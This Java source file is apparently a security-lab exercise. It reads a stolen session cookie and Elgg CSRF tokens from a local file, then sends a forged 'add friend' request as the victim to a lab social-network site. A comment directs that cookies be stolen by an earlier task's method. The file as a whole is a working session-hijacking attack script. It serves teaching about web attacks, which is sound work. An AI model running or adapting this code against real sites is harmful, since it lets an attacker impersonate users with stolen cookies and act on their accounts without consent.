import java.io.*;
import java.net.*;
public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {
			int responseCode;
			InputStream responseIn=null;

			File task2input = new File("task2input.txt");
			BufferedReader reader = new BufferedReader(new FileReader(task2input));

			String ts = reader.readLine();
			String token = reader.readLine();
			String cookie = reader.readLine();
			
			String requestDetails = "&__elgg_ts="+ts+"&__elgg_token="+token;

			// URL to be forged.
			URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=42"+requestDetails);

			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			HttpURLConnection urlCon = (HttpURLConnection) url.openConnection();
			if (urlCon instanceof HttpURLConnection) {
				urlCon.setConnectTimeout(60000);
				urlCon.setReadTimeout(90000);
			}

			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			// Add other necessary HTTP Headers yourself. Cookies should be stolen
			// using the method in task1.
			urlCon.addRequestProperty("User-agent", "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
			urlCon.addRequestProperty("Cookie",cookie);

			//HTTP Post Data which includes the information to be sent to the server.
			String data = "name=Samy&guid=42";

			// DoOutput flag of URL Connection should be set t
			urlCon.setDoOutput(true);

			// OutputStreamWriter is used to write the HTTP POST data
			// to the URL connection.
			OutputStreamWriter wr = new OutputStreamWriter(urlCon.getOutputStream());
			wr.write(data);
			wr.flush();

			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an HTTP request.
			if (urlCon instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlCon;

				// Contacts the web server and gets the status code from
				// the HTTP Response message.
				responseCode = httpConn.getResponseCode();
				System.out.println("Response Code = " + responseCode);

				// HTTP status code HTTP_OK means the response was received successfully.
				if (responseCode == HttpURLConnection.HTTP_OK) {
					
					// Get the input stream from url connection object.
					responseIn = urlCon.getInputStream();

					// Create an instance for BufferedReader
					// to read the response line by line.
					BufferedReader buf_inp = new BufferedReader(
							new InputStreamReader(responseIn));
					String inputLine;
					while((inputLine = buf_inp.readLine()) != null) {
						System.out.println(inputLine);
					}
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
}
